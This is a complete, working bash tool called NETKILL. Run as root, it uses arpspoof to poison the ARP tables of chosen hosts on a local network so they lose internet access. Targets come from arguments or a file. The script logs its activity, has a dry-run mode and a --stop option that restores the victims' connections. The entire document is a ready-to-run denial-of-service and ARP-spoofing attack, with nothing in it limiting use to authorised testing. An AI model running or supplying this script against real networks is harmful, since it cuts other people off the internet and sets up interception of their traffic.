#!/bin/bash
INTERFACE=${DEFAULT_INTERFACE:-eth0}
GATEWAY=${DEFAULT_GATEWAY:-'192.168.0.1'}
PID_FILE="/tmp/netkill_pids"
TARGETS_FILE="/tmp/netkill_targets"
LOG_DATE=$(date +"%Y-%m-%d")
LOG_DIR="/var/log/netkill/$LOG_DATE"
DAYS_TO_KEEP_LOGS=7
DRY_RUN=${DRY_RUN:-false}

# ─────────────────────────────────────────
#  Color output
# ─────────────────────────────────────────
NC='\033[0m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
RED='\033[0;31m'

info() { echo -e "${CYAN}[*] $*${NC}"; }
warn() { echo -e "${YELLOW}[!] $*${NC}"; }
error() { echo -e "${RED}[✘] $*${NC}"; }

# ─────────────────────────────────────────
#  Require root
# ─────────────────────────────────────────
trap 'warn "Caught interrupt. Run with --stop to clean up."; exit 1' INT TERM
if [[ $EUID -ne 0 ]]; then
    error "This script must be run as root."
    exit 1
fi

# ─────────────────────────────────────────
#  Ensure log directory
# ─────────────────────────────────────────
if [ -d "$LOG_DIR" ]; then
    # ─────────────────────────────────────────
    #  Log rotation: delete logs older than 7 days
    # ─────────────────────────────────────────
    info "Cleaning up old logs (older than $DAYS_TO_KEEP_LOGS days)..."
    find "$LOG_DIR" -mindepth 1 -maxdepth 1 -type d -mtime +"$DAYS_TO_KEEP_LOGS" -exec rm -rf {} \;
else
    mkdir -p "$LOG_DIR"
fi

if [[ "$DRY_RUN" == true ]]; then
    warn "RUNNING IN DRY RUN MODE"
fi

kill_internet() {
    info "NETKILL starting..."
    local isSpoofing=0

    if [[ -f "$PID_FILE" ]]; then
        warn "There's already another PID file at $PID_FILE"
        warn "This indicates that the last session was not closed properly."
        warn "Please kill all these processes before starting again:"
        cat "$PID_FILE"
        exit 1
    fi

    if [[ -f "$TARGETS_FILE" ]]; then
        warn "There's already another targets file at $TARGETS_FILE"
        warn "This indicates that the last session was not closed properly."
        warn "Please kill all these processes before starting again:"
        cat "$TARGETS_FILE"
        exit 1
    fi

    for target in "$@"; do
        info "Checking if $target is online..."

        if ping -c1 -W1 "$target"; then
            isSpoofing=1
            info "$target is online, ready for spoofing"
            SPOOF_CMD="/bin/arpspoof -i \"$INTERFACE\" -t \"$target\" \"$GATEWAY\" >\"$LOG_DIR/$target\" 2>&1 &"

            if [[ "$DRY_RUN" == true ]]; then
                warn "[DRY RUN] Would execute: $SPOOF_CMD"
            else
                info "Killing internet for IP $target"
                eval "$SPOOF_CMD"
                local pid="$!"
                echo "$pid" >>"$PID_FILE"
                echo "$target" >>"$TARGETS_FILE"
                info "Wrote PID $pid to $PID_FILE"
                info "Logs being saved to $LOG_DIR/$target"
                info "Waiting before next kill"
                sleep 3
            fi
        else
            warn "$target is offline or unreachable. Will not spoof to prevent GARP broadcasts."
        fi
    done

    if [[ "$isSpoofing" == 0 ]]; then
        info "No targets online"
        exit 1
    fi

    if [[ "$DRY_RUN" == true ]]; then
        info "Dry run completed. No processes started."
    else
        info "Spoofing started for reachable targets. PIDs stored in $PID_FILE"
    fi
}

restore_internet() {
    info "Restoring Internet..."
    if [[ -f "$PID_FILE" ]]; then
        while read -r PID; do
            info "Killing background process $PID"
            kill -TERM "$PID" 2>/dev/null
        done <"$PID_FILE"
    else
        warn "No running spoofing processes found"
        exit 1
    fi

    info "Triggering ARP refresh for spoofed targets"
    if [[ -f "$TARGETS_FILE" ]]; then
        while read -r target; do
            info "Pinging $target to stimulate ARP refresh"
            ping -c 30 -W 1 "$target" >/dev/null &
            info "Internet can take some seconds to come back"
        done <"$TARGETS_FILE"
    else
        warn "No targets to ping. Did you run the script last time?"
    fi

    info "All spoofing processes stopped, Internet restored"
    rm -f "$PID_FILE"
    rm -f "$TARGETS_FILE"
}

# ─────────────────────────────────────────
#  Main CLI handler
# ─────────────────────────────────────────
TARGETS=()
while [[ "$#" -gt 0 ]]; do
    case "$1" in
    -d | --dry-run)
        DRY_RUN=true
        ;;
    --stop)
        restore_internet
        exit 0
        ;;
    *)
        if [[ -f "$1" ]]; then
            while IFS= read -r line; do
                [[ -n "$line" && ! "$line" =~ ^# ]] && TARGETS+=("$line")
            done <"$1"
        else
            TARGETS+=("$1")
        fi
        ;;
    esac
    shift
done

if [[ "${#TARGETS[@]}" -eq 0 ]]; then
    echo "Usage:"
    echo "  $0 <target_ip1> <target_ip2> ...          # To start spoofing"
    echo "  $0 <file_with_ips.txt>                    # To read targets from a file"
    echo "  $0 --stop                                 # To stop spoofing"
    echo "  $0 -d <target_ip1> <target_ip2> ...       # Dry run mode"
    echo "  $0 -d <file_with_ips.txt>                 # Dry run from file"
    exit 1
fi

kill_internet "${TARGETS[@]}"
